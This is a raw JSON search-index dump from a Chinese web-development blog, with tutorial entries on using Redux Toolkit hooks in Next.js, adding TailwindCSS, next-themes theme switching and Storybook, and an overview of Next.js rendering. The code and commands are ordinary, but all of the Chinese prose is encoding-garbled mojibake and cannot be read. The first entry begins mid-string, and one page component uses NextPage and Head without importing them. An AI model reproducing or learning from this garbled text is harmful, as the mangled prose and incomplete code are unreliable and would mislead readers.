æˆ\u0026quot;æ±¡æŸ“\u0026quot;ã€‚\n  æ‰€ä»¥ï¼Œè®°ä½ä»¥ä¸Šä¸¤ç‚¹ï¼Œå°±å¯ä»¥å¾ˆå¥½åœ°å»ä½¿ç”¨ Reduxã€‚ä»¥åŠæ¥ä¸‹æ¥è¦è®¨è®ºçš„ Hooks + Reduxã€‚\n\rå¼€å§‹ 1. åˆ›å»º Next.js é¡¹ç›® yarn create next-app --typescript 2. å®‰è£… Redux 1 2 3 4  yarn add react-redux @types/react-redux @reduxjs/toolkit yarn add --dev redux-devtools   ä»¥ä¸Šå®‰è£…äº† React-Reduxã€TypeScriptæ”¯æŒã€Reduxå·¥å…·åŒ…ï¼ˆtoolkit åŒ…å«äº† Redux æ ¸å¿ƒ + Thunk + Reselectï¼‰\nä»¥åŠç”¨äºå¼€å‘æµ‹è¯•çš„ redux-devtools å·¥å…·ã€‚\næ³¨æ„ï¼šä»¥ä¸Šçš„å®‰è£…æ–¹å¼æ˜¯åœ¨å·²æœ‰çš„é¡¹ç›®ä¸­å®‰è£…çš„ï¼ˆNext.js é¡¹ç›®ä¸­ï¼‰ã€‚\n3. æ”¹å˜ç›®å½•ç»“æ„ ğŸ“¦src\râ”œâ”€ ğŸ“‚app\râ”‚ â”œâ”€ ğŸ“œhooks.ts\râ”‚ â””â”€ ğŸ“œstore.ts\râ”œâ”€ ğŸ“‚features\râ”‚ â””â”€ ğŸ“‚counter\râ”‚ â”‚ â”œâ”€ ğŸ“œCounter.module.css\râ”‚ â”‚ â”œâ”€ ğŸ“œCounter.tsx\râ”‚ â”‚ â”œâ”€ ğŸ“œcounterAPI.ts\râ”‚ â”‚ â””â”€ ğŸ“œcounterSlice.ts\râ””â”€ ğŸ“‚pages\râ”‚ â”œâ”€ ğŸ“‚api\râ”‚ â”‚ â””â”€ ğŸ“œhello.ts\râ”‚ â”œâ”€ ğŸ“œindex.tsx\râ”‚ â””â”€ ğŸ“œ_app.tsx å°† pages æ”¾å…¥ æ–°å»ºçš„ src ç›®å½•ä¸­ï¼š\n4. åˆ›å»º Store å› ä¸ºæˆ‘å–œæ¬¢ TS å’Œ Hooksï¼Œæ‰€ä»¥åˆ›å»º Store çš„æ—¶å€™æ­¥éª¤ä¼šå¤šä¸€ç‚¹ï¼Œä½†æ˜¯è¿™æ˜¯å€¼å¾—çš„ã€‚\né¡ºå¸¦ä¸€æçš„æ˜¯ï¼ŒNext.js æ˜¯æˆ‘çš„é€‰æ‹©ï¼Œå¯ä»¥æ²¡æœ‰ Reduxï¼Œä½†æ˜¯ä¸èƒ½æ²¡æœ‰ Next.jsã€‚\næ‰€ä»¥ï¼Œé…ç½®çš„æ—¶å€™æˆ‘ä¼šæ ¹æ® Next.js çš„ç›®å½•åšä¸€äº›é…ç½®ã€‚\nåœ¨srcç›®å½•ä¸­æ–°å»ºä¸€ä¸ªappç›®å½•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  // src/app/store.ts import { configureStore, ThunkAction, Action } from \u0026#39;@reduxjs/toolkit\u0026#39;; // import counterReducer from \u0026#39;../features/counter/counterSlice\u0026#39;;  export const store = configureStore({ reducer: { // è¿™é‡Œæ”¾ç½® slice ä¸­çš„ reducerï¼Œä¾‹å¦‚  // counter: counterReducer,  }, }); export type AppDispatch = typeof store.dispatch; export type RootState = ReturnType\u0026lt;typeof store.getState\u0026gt;; export type AppThunk\u0026lt;ReturnType = void\u0026gt; = ThunkAction\u0026lt; ReturnType, RootState, unknown, Action\u0026lt;string\u0026gt; \u0026gt;;   1 2 3 4 5 6 7 8  // src/app/hooks.ts import { TypedUseSelectorHook, useDispatch, useSelector } from \u0026#39;react-redux\u0026#39;; import type { RootState, AppDispatch } from \u0026#39;./store\u0026#39;; // åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨ï¼Œè€Œä¸æ˜¯ç®€å•çš„ `useDispatch` å’Œ `useSelector` export const useAppDispatch = () =\u0026gt; useDispatch\u0026lt;AppDispatch\u0026gt;(); export const useAppSelector: TypedUseSelectorHook\u0026lt;RootState\u0026gt; = useSelector;   1 2 3 4 5 6 7 8 9 10 11 12 13 14  // src/pages/_app.tsx import { Provider } from \u0026#39;react-redux\u0026#39; import type { AppProps } from \u0026#39;next/app\u0026#39; import { store } from \u0026#39;../app/store\u0026#39; export default function MyApp({ Component, pageProps }: AppProps) { return ( \u0026lt;Provider store={store}\u0026gt; \u0026lt;Component {...pageProps} /\u0026gt; \u0026lt;/Provider\u0026gt; ) }   5. Counter è®¡æ•°å™¨  src/features/counter/Counter.tsx  import React, { useState } from \u0026#39;react\u0026#39;;\rimport { useAppSelector, useAppDispatch } from \u0026#39;../../app/hooks\u0026#39;;\rimport {\rdecrement,\rincrement,\rincrementByAmount,\rincrementAsync,\rincrementIfOdd,\rselectCount,\r} from \u0026#39;./counterSlice\u0026#39;;\rimport styles from \u0026#39;./Counter.module.css\u0026#39;;\rexport function Counter() {\rconst count = useAppSelector(selectCount);\rconst dispatch = useAppDispatch();\rconst [incrementAmount, setIncrementAmount] = useState(\u0026#39;2\u0026#39;);\rconst incrementValue = Number(incrementAmount) || 0;\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;div className={styles.row}\u0026gt;\r\u0026lt;button\rclassName={styles.button}\raria-label=\u0026#34;Decrement value\u0026#34;\ronClick={() =\u0026gt; dispatch(decrement())}\r\u0026gt;\r-\r\u0026lt;/button\u0026gt;\r\u0026lt;span className={styles.value}\u0026gt;{count}\u0026lt;/span\u0026gt;\r\u0026lt;button\rclassName={styles.button}\raria-label=\u0026#34;Increment value\u0026#34;\ronClick={() =\u0026gt; dispatch(increment())}\r\u0026gt;\r+\r\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div className={styles.row}\u0026gt;\r\u0026lt;input\rclassName={styles.textbox}\raria-label=\u0026#34;Set increment amount\u0026#34;\rvalue={incrementAmount}\ronChange={(e) =\u0026gt; setIncrementAmount(e.target.value)}\r/\u0026gt;\r\u0026lt;button\rclassName={styles.button}\ronClick={() =\u0026gt; dispatch(incrementByAmount(incrementValue))}\r\u0026gt;\ræ·»åŠ é‡‘é¢\r\u0026lt;/button\u0026gt;\r\u0026lt;button\rclassName={styles.asyncButton}\ronClick={() =\u0026gt; dispatch(incrementAsync(incrementValue))}\r\u0026gt;\rå¼‚æ­¥æ·»åŠ \r\u0026lt;/button\u0026gt;\r\u0026lt;button\rclassName={styles.button}\ronClick={() =\u0026gt; dispatch(incrementIfOdd(incrementValue))}\r\u0026gt;\rå¦‚æœå¥‡æ•°åˆ™æ·»åŠ \r\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}  src/features/counter/Counter.module.css  .row {\rdisplay: flex;\ralign-items: center;\rjustify-content: center;\r}\r.row \u0026gt; button {\rmargin-left: 4px;\rmargin-right: 8px;\r}\r.row:not(:last-child) {\rmargin-bottom: 16px;\r}\r.value {\rfont-size: 78px;\rpadding-left: 16px;\rpadding-right: 16px;\rmargin-top: 2px;\rfont-family: \u0026#39;Courier New\u0026#39;, Courier, monospace;\r}\r.button {\rappearance: none;\rbackground: none;\rfont-size: 32px;\rpadding-left: 12px;\rpadding-right: 12px;\routline: none;\rborder: 2px solid transparent;\rcolor: rgb(112, 76, 182);\rpadding-bottom: 4px;\rcursor: pointer;\rbackground-color: rgba(112, 76, 182, 0.1);\rborder-radius: 2px;\rtransition: all 0.15s;\r}\r.textbox {\rfont-size: 32px;\rpadding: 2px;\rwidth: 64px;\rtext-align: center;\rmargin-right: 4px;\r}\r.button:hover,\r.button:focus {\rborder: 2px solid rgba(112, 76, 182, 0.4);\r}\r.button:active {\rbackground-color: rgba(112, 76, 182, 0.2);\r}\r.asyncButton {\rcomposes: button;\rposition: relative;\r}\r.asyncButton:after {\rcontent: \u0026#39;\u0026#39;;\rbackground-color: rgba(112, 76, 182, 0.15);\rdisplay: block;\rposition: absolute;\rwidth: 100%;\rheight: 100%;\rleft: 0;\rtop: 0;\ropacity: 0;\rtransition: width 1s linear, opacity 0.5s ease 1s;\r}\r.asyncButton:active:after {\rwidth: 0%;\ropacity: 1;\rtransition: 0s;\r}  src/features/counter/counterAPI.ts  // æ¨¡æ‹Ÿå¯¹æ•°æ®å‘å‡ºå¼‚æ­¥è¯·æ±‚çš„æ¨¡æ‹Ÿå‡½æ•°\rexport function fetchCount(amount = 1) {\rreturn new Promise\u0026lt;{ data: number }\u0026gt;((resolve) =\u0026gt;\rsetTimeout(() =\u0026gt; resolve({ data: amount }), 500)\r);\r}  src/features/counter/counterSlice.ts  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82  import { createAsyncThunk, createSlice, PayloadAction } from \u0026#39;@reduxjs/toolkit\u0026#39;; import { RootState, AppThunk } from \u0026#39;../../app/store\u0026#39;; import { fetchCount } from \u0026#39;./counterAPI\u0026#39;; export interface CounterState { value: number; status: \u0026#39;idle\u0026#39; | \u0026#39;loading\u0026#39; | \u0026#39;failed\u0026#39;; } const initialState: CounterState = { value: 0, status: \u0026#39;idle\u0026#39;, }; // ä¸‹é¢çš„å‡½æ•°ç§°ä¸º thunkï¼Œå®ƒå…è®¸æ‰§è¡Œå¼‚æ­¥é€»è¾‘ã€‚ // å®ƒå¯ä»¥åƒå¸¸è§„æ“ä½œä¸€æ ·è°ƒåº¦ï¼š`dispatch(incrementAsync(10))`ã€‚  // è¿™å°†ä½¿ç”¨ `dispatch` å‡½æ•°ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°è°ƒç”¨ thunkã€‚ // ç„¶åå¯ä»¥æ‰§è¡Œå¼‚æ­¥ä»£ç å¹¶å¯ä»¥è°ƒåº¦å…¶ä»–æ“ä½œã€‚ Thunk é€šå¸¸ç”¨äºå‘å‡ºå¼‚æ­¥è¯·æ±‚ã€‚  export const incrementAsync = createAsyncThunk( \u0026#39;counter/fetchCount\u0026#39;, async (amount: number) =\u0026gt; { const response = await fetchCount(amount); // è¿”å›çš„å€¼æˆä¸º â€œå·²å®Œæˆâ€ æ“ä½œè´Ÿè½½ï¼ˆaction payloadï¼‰  return response.data; } ); export const counterSlice = createSlice({ name: \u0026#39;counter\u0026#39;, //è¿™é‡Œçš„ `counter` æ˜¯ store ä¸­çš„ reducer å­—æ®µçš„ counter  initialState, // `reducers` å­—æ®µå¯ä»¥å®šä¹‰ reducer å¹¶ç”Ÿæˆç›¸å…³çš„æ“ä½œ  reducers: { increment: (state) =\u0026gt; { // Redux Toolkit å…è®¸åœ¨ reducer ä¸­ç¼–å†™â€œå˜å¼‚â€é€»è¾‘ã€‚  // å®ƒå®é™…ä¸Šå¹¶æ²¡æœ‰æ”¹å˜çŠ¶æ€ï¼Œå› ä¸ºå®ƒä½¿ç”¨äº† Immer åº“ï¼Œ  // å®ƒæ£€æµ‹ â€œdraft stateï¼ˆè‰ç¨¿çŠ¶æ€ï¼‰â€ çš„å˜åŒ–ï¼Œå¹¶æ ¹æ®è¿™äº›å˜åŒ–äº§ç”Ÿä¸€ä¸ªå…¨æ–°çš„ä¸å¯å˜çŠ¶æ€  state.value += 1; }, decrement: (state) =\u0026gt; { state.value -= 1; }, // ä½¿ç”¨ PayloadAction ç±»å‹å£°æ˜ `action.payload` çš„å†…å®¹  incrementByAmount: (state, action: PayloadAction\u0026lt;number\u0026gt;) =\u0026gt; { state.value += action.payload; }, }, // `extraReducers` å­—æ®µè®©åˆ‡ç‰‡å¤„ç†åœ¨åˆ«å¤„ï¼ˆreducers å­—æ®µä¹‹å¤–ï¼‰å®šä¹‰çš„åŠ¨ä½œï¼ŒåŒ…æ‹¬ç”± createAsyncThunk æˆ–å…¶ä»–åˆ‡ç‰‡ç”Ÿæˆçš„åŠ¨ä½œã€‚  extraReducers: (builder) =\u0026gt; { builder .addCase(incrementAsync.pending, (state) =\u0026gt; { state.status = \u0026#39;loading\u0026#39;; }) .addCase(incrementAsync.fulfilled, (state, action) =\u0026gt; { state.status = \u0026#39;idle\u0026#39;; state.value += action.payload; }); }, }); export const { increment, decrement, incrementByAmount } = counterSlice.actions; // ä¸‹é¢çš„å‡½æ•°ç§°ä¸ºé€‰æ‹©å™¨ï¼Œå®ƒå…è®¸ä»çŠ¶æ€ä¸­é€‰æ‹©ä¸€ä¸ªå€¼ã€‚ // ä¹Ÿå¯ä»¥åœ¨ä½¿ç”¨å®ƒä»¬çš„åœ°æ–¹è€Œä¸æ˜¯åœ¨åˆ‡ç‰‡æ–‡ä»¶ä¸­å†…è”å®šä¹‰é€‰æ‹©å™¨ã€‚ // ä¾‹å¦‚ï¼š`useSelector((state: RootState) =\u0026gt; state.counter.value)` export const selectCount = (state: RootState) =\u0026gt; state.counter.value; // ä¹Ÿå¯ä»¥æ‰‹å·¥ç¼–å†™ thunkï¼Œå®ƒå¯èƒ½åŒ…å«åŒæ­¥å’Œå¼‚æ­¥é€»è¾‘ã€‚ // è¿™æ˜¯ä¸€ä¸ªåŸºäºå½“å‰çŠ¶æ€æœ‰æ¡ä»¶åœ°åˆ†æ´¾åŠ¨ä½œçš„ä¾‹å­ã€‚ export const incrementIfOdd = (amount: number): AppThunk =\u0026gt; ( dispatch, getState ) =\u0026gt; { const currentValue = selectCount(getState()); if (currentValue % 2 === 1) { dispatch(incrementByAmount(amount)); } }; export default counterSlice.reducer;    src/pages/index.tsx  import { Counter } from \u0026#39;../features/counter/Counter\u0026#39;\rimport styles from \u0026#39;../../styles/Home.module.css\u0026#39;\rconst IndexPage: NextPage = () =\u0026gt; {\rreturn (\r\u0026lt;div className={styles.container}\u0026gt;\r\u0026lt;Head\u0026gt;\r\u0026lt;title\u0026gt;Redux Toolkit\u0026lt;/title\u0026gt;\r\u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;/favicon.ico\u0026#34; /\u0026gt;\r\u0026lt;/Head\u0026gt;\r\u0026lt;main className={styles.header}\u0026gt;\r\u0026lt;img src=\u0026#34;/vercel.svg\u0026#34; className={styles.logo} alt=\u0026#34;logo\u0026#34; /\u0026gt;\r\u0026lt;Counter /\u0026gt;\r\u0026lt;/main\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rexport default IndexPage ","description":" Redux å’Œ React Hooks çš„é…åˆï¼Œæˆ‘å¯¹ Redux çš„ç†è§£","id":59,"section":"react","tags":null,"title":"Hooks \u0026 Redux","uri":"https://codthing.github.io/react/redux/hooks-redux/"},{"content":"Next.js ä¸å„ç§æŠ€æœ¯æ ˆçš„ç»„åˆ\nNext.js + TailwindCSS + SB + zustand æ³¨æ„ï¼š ä¸æ”¯æŒIEæµè§ˆå™¨\n1. VSCode æ’ä»¶   PostCSS Language Support\n  Tailwind CSS IntelliSense\n  2. TailwindCSS åœ¨ Next.js v10+ é¡¹ç›®ä¸­è®¾ç½® Tailwind CSS\nStep1. åˆ›å»ºé¡¹ç›® 1 2  yarn create next-app --typescript   Step2. å®‰è£…Tailwind CSS tailwindcss é€šè¿‡ yarn å®‰è£…åŠå…¶å¯¹ç­‰ä¾èµ–é¡¹ï¼Œç„¶åè¿è¡Œ â€‹â€‹init å‘½ä»¤ç”Ÿæˆ tailwind.config.js å’Œ postcss.config.js.\n1 2 3 4  yarn add --dev tailwindcss postcss autoprefixer npx tailwindcss init -p   Step3. é…ç½®æ¨¡æ¿è·¯å¾„ åœ¨æ–‡ä»¶ä¸­æ·»åŠ æ‰€æœ‰æ¨¡æ¿æ–‡ä»¶çš„è·¯å¾„ tailwind.config.jsã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  module.exports = { content: [ \u0026#34;./pages/**/*.{js,ts,jsx,tsx}\u0026#34;, \u0026#34;./components/**/*.{js,ts,jsx,tsx}\u0026#34;, ], theme: { extend: {}, }, plugins: [], } // æˆ–è€…ï¼ˆåŸºäºç›®å½•ç»“æ„è°ƒæ•´ï¼‰ module.exports = { content: [ \u0026#34;./src/pages/**/*.{js,ts,jsx,tsx}\u0026#34;, \u0026#34;./src/components/**/*.{js,ts,jsx,tsx}\u0026#34;, ], theme: { extend: {}, }, plugins: [], }   Step4. å°† Tailwind æŒ‡ä»¤æ·»åŠ åˆ° CSS å°† @tailwindTailwind çš„æ¯ä¸ªå±‚çš„æŒ‡ä»¤æ·»åŠ åˆ°æ–‡ä»¶ä¸­ã€‚ ./styles/globals.css\n1 2 3 4  @tailwind base; @tailwind components; @tailwind utilities;   Step5. å¯åŠ¨å¼€å‘æœåŠ¡å™¨ 1 2  yarn dev   Step6. å¼€å§‹åœ¨é¡¹ç›®ä¸­ä½¿ç”¨ Tailwind å¼€å§‹ä½¿ç”¨ Tailwind çš„å®ç”¨ç¨‹åºç±»æ¥è®¾è®¡å†…å®¹ã€‚\n1 2 3 4 5 6 7 8  export default function Home() { return ( \u0026lt;h1 className=\u0026#34;text-3xl font-bold underline\u0026#34;\u0026gt; Hello world! \u0026lt;/h1\u0026gt; ) }   3. ä¸»é¢˜åˆ‡æ¢ Step1. å®‰è£… next-themes 1 2  yarn add next-themes   1 2 3 4 5 6 7 8 9 10 11 12 13  // pages/_app.tsx import \u0026#39;../styles/globals.css\u0026#39; import type { AppProps } from \u0026#39;next/app\u0026#39; import { ThemeProvider } from \u0026#39;next-themes\u0026#39;; function MyApp({ Component, pageProps }: AppProps) { return \u0026lt;ThemeProvider\u0026gt; \u0026lt;Component {...pageProps} /\u0026gt; \u0026lt;/ThemeProvider\u0026gt; } export default MyApp   Step2. åœ¨ Next.js åˆ›å»ºä¸€ä¸ª ThemeChanger.tsx æ–‡ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  // components/ThemeChanger.tsx import { useEffect, useState } from \u0026#39;react\u0026#39;; import { useTheme } from \u0026#39;next-themes\u0026#39;; const themes = [{ name: \u0026#39;Light\u0026#39; }, { name: \u0026#39;Dark\u0026#39; }, { name: \u0026#39;Emerald\u0026#39; }, { name: \u0026#39;Pink\u0026#39; }]; const ThemeChanger = () =\u0026gt; { const [mounted, setMounted] = useState(false); const { theme, setTheme } = useTheme(); // å½“å®‰è£…åœ¨å®¢æˆ·ç«¯æ—¶ï¼Œç°åœ¨å¯ä»¥æ˜¾ç¤º UI  useEffect(() =\u0026gt; setMounted(true), []); if (!mounted) return null; return ( \u0026lt;div className=\u0026#34;p-8 flex justify-between items-center font-bold text-xl bg-th-background-secondary text-th-primary-dark\u0026#34;\u0026gt; \u0026lt;span\u0026gt; å½“å‰ä¸»é¢˜: \u0026lt;strong\u0026gt;{theme}\u0026lt;/strong\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label htmlFor=\u0026#34;theme-select\u0026#34; className=\u0026#34;sr-only mr-2\u0026#34;\u0026gt; é€‰æ‹©ä¸»é¢˜: \u0026lt;/label\u0026gt; \u0026lt;select name=\u0026#34;theme\u0026#34; id=\u0026#34;theme-select\u0026#34; className=\u0026#34;bg-white text-gray-800 border-gray-800 border py-1 px-3\u0026#34; onChange={(e) =\u0026gt; setTheme(e.currentTarget.value)} value={theme} \u0026gt; \u0026lt;option value=\u0026#34;\u0026#34;\u0026gt;é€‰æ‹©ä¸»é¢˜\u0026lt;/option\u0026gt; {themes.map((t) =\u0026gt; ( \u0026lt;option key={t.name.toLowerCase()} value={t.name.toLowerCase()}\u0026gt; {t.name} \u0026lt;/option\u0026gt; ))} \u0026lt;/select\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; ); }; export default ThemeChanger;   Step3. å¯ç”¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  // pages/index.tsx import type { NextPage } from \u0026#39;next\u0026#39; import Head from \u0026#39;next/head\u0026#39; import ThemeChanger from \u0026#39;../components/ThemeChanger\u0026#39;; const Home: NextPage = () =\u0026gt; { return ( \u0026lt;div\u0026gt; \u0026lt;Head\u0026gt; \u0026lt;title\u0026gt;Create Next App\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;Generated by create next app\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;/favicon.ico\u0026#34; /\u0026gt; \u0026lt;/Head\u0026gt; \u0026lt;ThemeChanger /\u0026gt; \u0026lt;main\u0026gt; \u0026lt;h1\u0026gt; Hello world! \u0026lt;/h1\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/div\u0026gt; ) } export default Home   Step4. ä¿®æ”¹ globals.css æ ·å¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72  // styles/globals.css @tailwind base; @tailwind components; @tailwind utilities; html, body { height: 100%; display: grid; padding: 0; margin: 0; font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif; } #__next { height: 100%; grid-row: 1/-1; grid-column: 1/-1; } a { color: inherit; text-decoration: none; } * { box-sizing: border-box; } :root { --background: theme(\u0026#34;colors.white\u0026#34;); --background-secondary: theme(\u0026#34;colors.gray.50\u0026#34;); --primary-dark: theme(\u0026#34;colors.gray.900\u0026#34;); --primary-medium: theme(\u0026#34;colors.gray.700\u0026#34;); --primary-light: theme(\u0026#34;colors.gray.500\u0026#34;); } [data-theme=\u0026#34;dark\u0026#34;] { --background: theme(\u0026#34;colors.black\u0026#34;); --background-secondary: theme(\u0026#34;colors.gray.800\u0026#34;); --accent-dark: theme(\u0026#34;colors.fuchsia.900\u0026#34;); --accent-medium: theme(\u0026#34;colors.fuchsia.700\u0026#34;); --accent-light: theme(\u0026#34;colors.fuchsia.500\u0026#34;); --primary-dark: theme(\u0026#34;colors.gray.300\u0026#34;); --primary-medium: theme(\u0026#34;colors.gray.200\u0026#34;); --primary-light: theme(\u0026#34;colors.gray.100\u0026#34;); } [data-theme=\u0026#34;emerald\u0026#34;] { --background: theme(\u0026#34;colors.white\u0026#34;); --accent-dark: theme(\u0026#34;colors.emerald.900\u0026#34;); --accent-medium: theme(\u0026#34;colors.emerald.700\u0026#34;); --accent-light: theme(\u0026#34;colors.emerald.500\u0026#34;); } [data-theme=\u0026#34;pink\u0026#34;] { --background: theme(\u0026#34;colors.gray.900\u0026#34;); --background-secondary: theme(\u0026#34;colors.gray.800\u0026#34;); --accent-dark: theme(\u0026#34;colors.pink.900\u0026#34;); --accent-medium: theme(\u0026#34;colors.pink.700\u0026#34;); --accent-light: theme(\u0026#34;colors.pink.500\u0026#34;); --primary-dark: theme(\u0026#34;colors.gray.300\u0026#34;); --primary-medium: theme(\u0026#34;colors.gray.200\u0026#34;); --primary-light: theme(\u0026#34;colors.gray.100\u0026#34;); }   æ³¨æ„ï¼š ä½¿ç”¨ yarn buildå‰ï¼Œéœ€è¦æŠŠæœ¬åœ°æœåŠ¡åœæ‰ï¼Œå¦åˆ™ä¼šæ„å»ºå¤±è´¥ã€‚\n\r4. å®‰è£… Storybook Step1. å®‰è£… sb 1 2  npx sb init   Step2. å®‰è£… postCSS æ’ä»¶ 1 2  yarn add -D @storybook/addon-postcss   Step3. å°†æ’ä»¶æ·»åŠ åˆ° .storybook/main.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  // .storybook/main.js module.exports = { ... addons: [ ... { name: \u0026#39;@storybook/addon-postcss\u0026#39;, options: { cssLoaderOptions: { // When you have splitted your css over multiple files  // and use @import(\u0026#39;./other-styles.css\u0026#39;)  importLoaders: 1, }, postcssLoaderOptions: { // When using postCSS 8  implementation: require(\u0026#39;postcss\u0026#39;), }, }, }, ], };   Step4. å°† css æ–‡ä»¶å¯¼å…¥ .storybook/preview.js 1 2  import \u0026#39;../styles/globals.css\u0026#39;   Step5. ä¸º Storybook é…ç½® NextJS Images 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  // .storybook/preview.js + import * as NextImage from \u0026#34;next/image\u0026#34;; + const OriginalNextImage = NextImage.default; + Object.defineProperty(NextImage, \u0026#34;default\u0026#34;, { configurable: true, value: (props) =\u0026gt; ( \u0026lt;OriginalNextImage {...props} unoptimized /\u0026gt; ), });   Step6. ä¸º Storybook æä¾› Next.js å…¬å…±ç›®å½• 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  // package.json { ... \u0026#34;scripts\u0026#34;: { - \u0026#34;storybook\u0026#34;: \u0026#34;start-storybook -p 6006\u0026#34;, - \u0026#34;build-storybook\u0026#34;: \u0026#34;build-storybook\u0026#34; + \u0026#34;storybook\u0026#34;: \u0026#34;start-storybook -p 6006 -s ./public\u0026#34;, + \u0026#34;build-storybook\u0026#34;: \u0026#34;build-storybook -s public\u0026#34; }, ... }   ","description":"Next.js ä¸å„ç§æŠ€æœ¯æ ˆçš„ç»„åˆ","id":60,"section":"react","tags":null,"title":"Next.js å„ç§ç»„åˆ","uri":"https://codthing.github.io/react/next/next-multiple/"},{"content":"Next.js ç®€ä»‹ Next.js ç”± Vercel åˆ›å»ºï¼Œæ˜¯ä¸€ä¸ªæ··åˆ React åº”ç”¨ç¨‹åºçš„æ¡†æ¶ã€‚\né€šå¸¸å¾ˆéš¾ç†è§£åŠ è½½å†…å®¹çš„æ‰€æœ‰ä¸åŒæ–¹å¼ã€‚ Next.js å°†å…¶æŠ½è±¡åŒ–ä»¥ä½¿å…¶å°½å¯èƒ½ç®€å•ã€‚ è¯¥æ¡†æ¶å…è®¸æ„å»ºå¯æ‰©å±•ã€é«˜æ€§èƒ½çš„ React ä»£ç ï¼Œå¹¶å¸¦æœ‰é›¶é…ç½®æ–¹æ³•ã€‚ è¿™ä½¿å¼€å‘äººå‘˜å¯ä»¥ä¸“æ³¨äºæ„å»ºåŠŸèƒ½ã€‚\nè®©æˆ‘ä»¬æ¢ç´¢ä¸è®¨è®ºç›¸å…³çš„ Next.js åŠŸèƒ½\n\råŸºæœ¬åŠŸèƒ½ é¢„æ¸²æŸ“ é»˜è®¤æƒ…å†µä¸‹ï¼ŒNext.js ä¼šæå‰ä¸ºæ¯ä¸ªé¡µé¢ç”Ÿæˆ HTMLï¼Œè€Œä¸æ˜¯åœ¨å®¢æˆ·ç«¯ç”Ÿæˆã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºé¢„æ¸²æŸ“ã€‚\nNext.js ç¡®ä¿ä½¿é¡µé¢å®Œå…¨äº¤äº’æ‰€éœ€çš„ JavaScript ä»£ç ä¸ç”Ÿæˆçš„ HTML ç›¸å…³è”ã€‚\nä¸€æ—¦é¡µé¢åŠ è½½ï¼Œæ­¤ JavaScript ä»£ç å°±ä¼šè¿è¡Œã€‚æ­¤æ—¶ï¼ŒReact JS åœ¨ Shadow DOM ä¸­å·¥ä½œä»¥ç¡®ä¿å‘ˆç°çš„å†…å®¹ä¸ React åº”ç”¨ç¨‹åºå°†å‘ˆç°çš„å†…å®¹ç›¸åŒ¹é…ï¼Œè€Œæ— éœ€å®é™…æ“ä½œå®ƒã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºæ°´åˆä½œç”¨ã€‚\næ¯ä¸ªé¡µé¢éƒ½æ˜¯ä» pages ç›®å½•ä¸­çš„ .jsã€.jsxã€.ts æˆ– .tsx æ–‡ä»¶å¯¼å‡ºçš„ React ç»„ä»¶ã€‚è·¯ç”±æ˜¯æ ¹æ®æ–‡ä»¶åç¡®å®šçš„ã€‚\nä¾‹å¦‚ pages/about.js å¯¹åº”è·¯ç”±/aboutã€‚\nNext.js æ”¯æŒé€šè¿‡æœåŠ¡å™¨ç«¯æ¸²æŸ“ (SSR) å’Œé™æ€ç”Ÿæˆè¿›è¡Œé¢„æ¸²æŸ“ã€‚\nè¿˜å¯ä»¥åœ¨åŒä¸€ä¸ªåº”ç”¨ç¨‹åºä¸­æ··åˆä¸åŒçš„æ¸²æŸ“æ–¹æ³•ï¼Œå…¶ä¸­ä¸€äº›é¡µé¢ä½¿ç”¨ SSR ç”Ÿæˆï¼Œè€Œå…¶ä»–é¡µé¢ä½¿ç”¨é™æ€ç”Ÿæˆã€‚å®¢æˆ·ç«¯å‘ˆç°ä¹Ÿå¯ç”¨äºå‘ˆç°è¿™äº›é¡µé¢çš„æŸäº›éƒ¨åˆ†ã€‚\næ•°æ®è·å– Next.js æ”¯æŒä½¿ç”¨ SSR å’Œé™æ€ç”Ÿæˆæ¥è·å–æ•°æ®ã€‚\nNext.js æ¡†æ¶ä¸­çš„ä»¥ä¸‹åŠŸèƒ½ä½¿è¿™æˆä¸ºå¯èƒ½ã€‚\n  getStaticProps\n  ä¸é™æ€ç”Ÿæˆä¸€èµ·ä½¿ç”¨æ¥æ¸²æŸ“æ•°æ®\n  getStaticPaths\n  ä¸é™æ€ç”Ÿæˆä¸€èµ·ä½¿ç”¨ä»¥å‘ˆç°åŠ¨æ€è·¯ç”±\n  getServerSideProps\n  é€‚ç”¨äºSSR\n  é™æ€æ–‡ä»¶æœåŠ¡\n  åƒå›¾åƒè¿™æ ·çš„é™æ€æ–‡ä»¶å¯ä»¥åœ¨æ ¹ç›®å½•ä¸­åä¸º public 